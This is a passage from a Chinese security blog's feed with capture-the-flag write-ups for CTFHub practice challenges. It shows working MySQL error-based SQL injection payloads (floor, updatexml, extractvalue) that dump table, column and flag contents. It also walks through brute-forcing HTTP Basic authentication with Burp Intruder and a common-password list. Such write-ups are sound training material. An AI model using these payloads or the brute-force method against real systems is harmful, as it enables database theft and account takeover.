alt="image-20211014171737376"></p><p>会提示查询超过一行，所以我们还是加limit吧</p><blockquote><p>加limit</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;sqli&#x27; limit 0,1),0x7e,floor(rand(0)*2))name from information_schema.tables group by name; </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122031167.png" alt="image-20211012203143964"></p><p>再爆字段(这里字段名和表名都是flag)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select count(*),concat((select column_name from information_schema.columns where table_name=&#x27;flag&#x27; limit 0,1),0x7e,floor(rand(0)*2))name from information_schema.tables group by name;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110141700472.png" alt="image-20211014170042137"></p><p>然后爆字段的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select count(*),concat((select flag from sqli.flag),0x7e,floor(rand(0)*2))name from information_schema.tables group by name; </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110122033900.png" alt="image-20211012203338755"></p><p>拿到flag啦！！耶！</p><h1 id="CTFHub-SQL报错注入之updatexml"><a href="#CTFHub-SQL报错注入之updatexml" class="headerlink" title="CTFHub-SQL报错注入之updatexml()"></a>CTFHub-SQL报错注入之updatexml()</h1><h2 id="updatexml-函数解析"><a href="#updatexml-函数解析" class="headerlink" title="updatexml()函数解析"></a>updatexml()函数解析</h2><p>updatexml()函数是用来更新xml文档的函数，其语法为：updatexml(xml文档对象名称，xml路径，更新内容)</p><p>UPDATEXML (XML_document, XPath_string, new_value); </p><p>然后主要是第二个参数。第二个参数的正确用法应该是xpath格式的字符串，即’/xxx/xxx/xxx’这种格式，但是如果我们输入的参数不符合该规范，就会把报错内容显示出来。</p><div class="note warning simple"><p>updatexml的最大长度是32位，所以报错内容有时候显示不完整，需要用mid()函数或者其它函数来显示剩余的部分</p></div><p>对此，我们可以构造的有关updatexml()报错注入的SQL语句为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure><p>其中，database()的位置用来替换对应的查询语句。而updatexml的第一个参数和第三个参数可以随便填写，主要是利用第二个参数来进行报错注入。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>爆数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191909949.png" alt="image-20211019190902811"></p><p>提示XPATH语法错误，并且提示了错误信息</p><p>爆表名</p><blockquote><p>这里可以用group_concat，只是floor()函数不可用而已</p><p>后面的sqli必须加引号当作字符串，否则会提示找不到该字段</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191913321.png" alt="image-20211019191321241"></p><p>得到flag的表，然后爆字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191914872.png" alt="image-20211019191442804"></p><p>得到flag字段，所以可以直接爆sqli.flag的字段flag里的内容了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,(select flag from sqli.flag),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191917890.png" alt="image-20211019191729806"></p><p>因为updatexml的最大长度是32位，这里的flag加上前面的~(0x7e)总共32位，所以显示的flag有31位，要想显示剩下的flag的内容，这里用mid()函数</p><blockquote><p><code>MID()</code>函数用于从文本字段中提取字符。 SELECT MID(column_name,start[,length]) FROM table_name;</p></blockquote><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>column_name</td><td>必需。要提取字符的字段。</td></tr><tr><td>start</td><td>必需。规定开始位置（起始值是 1）。</td></tr><tr><td>length</td><td>可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</td></tr></tbody></table><p>因为已经显示31位flag字符，所以我们只需要从第32位字符开始提取就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,mid((select flag from sqli.flag),32),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191924790.png" alt="image-20211019192437694"></p><p>啊哈~可以看到第32位字符已经显示出来了，原来flag刚好有32位字符!!</p><div class="note red icon modern"><i class="note-icon fas fa-exclamation-circle"></i><p>这里会有人想：早知道concat的时候不在前面加0x7e了，这样刚好显示32位完整的flag</p><p>这个想法是错误的！！</p></div><p>这里演示一下concat()函数中的参数(select flag from sqli.flag)的前面不加0x7e</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat((select flag from sqli.flag),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191933760.png" alt="image-20211019193322693"></p><p>并没有显示完整的flag，那是不是前后都不加0x7e，就会显示完整的flag了？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat((select flag from sqli.flag)),1)</span><br><span class="line">1 and updatexml(1,(select flag from sqli.flag),1)        //两条语句相同意思，报了相同的错误，但还是不会显示完整flag</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191941765.png" alt="image-20211019194145640"></p><p>好吧还是没有显示完整的flag，不过因为flag字符个数就是32位左右，所以其实可以不用mid()函数，直接像上述中不加0x7e就可以显示后面剩下的字符了，不过如果需要显示更长一点的内容，就不得不用到mid()函数了</p><h1 id="CTFHub-SQL报错注入之extractvalue"><a href="#CTFHub-SQL报错注入之extractvalue" class="headerlink" title="CTFHub-SQL报错注入之extractvalue()"></a>CTFHub-SQL报错注入之extractvalue()</h1><h2 id="extractvalue-函数解析"><a href="#extractvalue-函数解析" class="headerlink" title="extractvalue()函数解析"></a>extractvalue()函数解析</h2><p>extractvalue()函数是用来查询xml文档的函数，从目标XML中返回包含所查询值的字符串。其语法为：extractvalue(xml文档对象名称，xml路径)</p><p>EXTRACTVALUE (XML_document, XPath_string);</p><p>所以其实和updatexml()差不多，还是利用extractvalue()函数中的第二个参数来构造payload。下面的解题内容聪明的可以略过了~</p><h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p>爆数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,database(),0x7e))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191956246.png" alt="image-20211019195655149"></p><p>爆表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;),0x7e))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191957088.png" alt="image-20211019195757011"></p><p>爆字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),0x7e))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191958990.png" alt="image-20211019195846791"></p><p>爆内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,(select flag from sqli.flag),0x7e),1)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,mid((select flag from sqli.flag),32),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110191959300.png" alt="image-20211019195932220"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110192001150.png" alt="image-20211019200127061"></p>]]></content>
    
    
    <summary type="html">三种常用SQL-报错注入方法的原理以及使用(floor()、updatexml()、extractvalue())</summary>
    
    
    
    <category term="CTFHub" scheme="https://jason177.com/categories/CTFHub/"/>
    
    
    <category term="SQL" scheme="https://jason177.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-HTTP基础认证</title>
    <link href="https://jason177.com/2021/09/29/ctfhub-http-basic/"/>
    <id>https://jason177.com/2021/09/29/ctfhub-http-basic/</id>
    <published>2021-09-29T05:28:22.000Z</published>
    <updated>2021-09-29T06:32:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CTFHub-基础认证"><a href="#CTFHub-基础认证" class="headerlink" title="CTFHub-基础认证"></a>CTFHub-基础认证</h1><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>题目位置：CTFHub-&gt;技能树-&gt;Web-&gt;Web前置技能-&gt;HTTP协议-&gt;基础认证</p></div><div class="note success disabled"><p><a href="https://www.ctfhub.com/">CTFHub官网</a></p></div><p>我靠…这么简单的题也好意思写博客…嘻嘻嘻，我就爱！</p><hr><h2 id="开始解题"><a href="#开始解题" class="headerlink" title="开始解题"></a>开始解题</h2><p>看题目</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291349515.png" alt="image-20210929114332527"></p><p>首先给了一个地址和一个题目附件，我们先去地址看一下</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291144825.png" alt="image-20210929114434729"></p><p>有个click链接，点进去会有提示要求你输入用户名和密码。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291144968.png" alt="image-20210929114453896"></p><p>然后我们再打开题目给的附件，可以看到文件名<mark class="hl-label red">可能</mark> 意思就是：一千万个密码中最热门的100个密码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291143423.png" alt="image-20210929114355318"></p><p>那好吧，密码字典已经给出来了，大概意思就是密码爆破咯。我们可以先尝试随便输入用户名和密码，然后利用<strong>Burp Suite</strong>进行抓包</p><div class="note info no-icon flat"><p>用户名：111</p><p>密码：123</p></div><h2 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h2><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291145254.png" alt="image-20210929114540150"></p><p>可以看到中间有一个Authorization:Basic 阿巴阿巴</p><p>“Basic”就是”基础”的意思，对应题目的”基础认证”</p><p>咦？阿巴阿巴后面居然有两个等号</p><p>Base64解码一下咯！</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291146786.png" alt="image-20210929114621674"></p><p>右键-&gt;转换选择-&gt;Base64-&gt;Base64解码</p><p>英文版的Burp Suite自己琢磨(我tm四级没过)</p><p>解出来如下</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291146081.png" alt="image-20210929114650979"></p><p>发现是自己输入的用户名和密码，中间冒号隔开，发送请求的时候Base64编码了</p><p>先不管，把请求包右键发送到重发器(REpeater)然后发送</p><h3 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291149872.png" alt="image-20210929114938674"></p><p>有提示！可以看到服务器的响应头里面有：”Do u know admin？”</p><p>所以用户名应该是admin</p><p>到这里可以用脚本对用户名和密码文件里的密码整合起来进行base64编码后爆破了</p><p>但是这里我比较菜，不会写脚本，所以用了个还算平民的方法(简单简单简单！)</p><h2 id="Notepad"><a href="#Notepad" class="headerlink" title="Notepad++"></a>Notepad++</h2><p>用Notepad++打开密码txt文件</p><p>Ctrl+H打开搜索替换</p><p>利用正则表达式，统一把”admin:”加在100个密码的前面</p><p>^表示行首，意思就是在每行行首凭空添加”admin:”，记得在下面把Search Mode中的Regular expression(正则表达式)选中</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291158620.png" alt="image-20210929115801503"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291156520.png" alt="image-20210929115659396"></p><h2 id="Burp-Suite-Intruder"><a href="#Burp-Suite-Intruder" class="headerlink" title="Burp Suite(Intruder)"></a>Burp Suite(Intruder)</h2><p>替换好之后回到Burp Suite，右键把数据包发送到测试器(Intruder),然后点击Positions，选中已经被Base64编码的那一串字符，做一个payload</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291159870.png" alt="image-20210929115903743"></p><p>点击Positions右边的Payloads</p><p>添加我们的”用户名:密码”到有效载荷选项中</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291204348.png" alt="image-20210929120446192"></p><p>然后发现了一个不重要的信息</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291205540.png" alt="image-20210929120512461"></p><p>为什么密码有101个！不是100个嘛！</p><p>经过我名侦探般的推理，后来发现是本来的密码文件的最后面多了个换行，导致添加”admin:”到密码文件的时候识别到最后一行的行首，所以在后面就多了一个”admin:”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291327824.png" alt="image-20210929132723779"></p><p>无关紧要，添加完密码文件后，在下面有效负载处理这边添加一个Base64编码规则</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291319193.png" alt="image-20210929131946082"></p><p>就是把密码文件中的字符先用Base64编码，然后再爆破</p><p>再往下拉</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291320654.png" alt="image-20210929132036581"></p><p>防止base64编码后的=号被URL编码</p><p>然后就可以右上角开始攻击了！</p><p>结束后点击长度排序一下，可以看到长度不同的有效载荷，就是正确的用户名和密码啦！</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291423106.png" alt="image-20210929142357974"></p><p>然后双击，就可以在下方的Response中看到flag</p><p>也可以直接复制这串base64放到数据包中的对应位置，然后放行数据包，就可以在网页上看到flag了！</p><p>也可以先解码一下，得到正确密码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291323241.png" alt="image-20210929132353144"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291324570.png" alt="image-20210929132402515"></p><p>然后再重新返回页面输入正确的用户名和密码得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109291325922.png" alt="image-20210929132508810"></p><div class="note green icon simple"><i class="note-icon fas fa-thumbs-up"></i><p>总结：</p><ol><li>填写用户名密码，然后用Burp Suite抓包，看到用户名和密码都被执行Base64编码后才传到服务器</li><li>抓的数据包发送到Repeater，看到响应头有提示用户名为admin</li><li>写脚本或者用Notepad++等其它软件在每行密码前添加”admin:”</li><li>抓的数据包发送到Intruder，然后对被Base64编码的地方添加一个payload</li><li>把密码文件载入到载荷中，进行base64编码后进行爆破攻击，得到正确的用户名和密码，拿到flag</li></ol></div><hr><blockquote><p>PS：好像正确的用户名密码不是固定的，记得自己手动做一下！</p><p>没想到第一条正经博客居然写那么啰嗦…</p></blockquote>]]></content>
    
    
    <summary type="html">CTFHub技能树上的http基础认证题</summary>
    
    
    
    <category term="CTFHub" scheme="https://jason177.com/categories/CTFHub/"/>
    
    
    <category term="http" scheme="https://jason177.com/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>我的第一篇文章</title>
    <link href="https://jason177.com/2021/09/25/onepost/"/>
    <id>https://jason177.com/2021/09/25/onepost/</id>
    <published>2021-09-25T08:28:40.000Z</published>
    <updated>2021-09-25T09:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr><h1 id="我的第一篇文章！"><a href="#我的第一篇文章！" class="headerlink" title="我的第一篇文章！"></a>我的第一篇文章！</h1><p>其实我也不知道要讲什么，就先这样吧！</p><p>开启我的Blog生涯！</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202109251640402.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="life" scheme="https://jason177.com/categories/life/"/>
    
    
    <category term="生活" scheme="https://jason177.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
</feed>
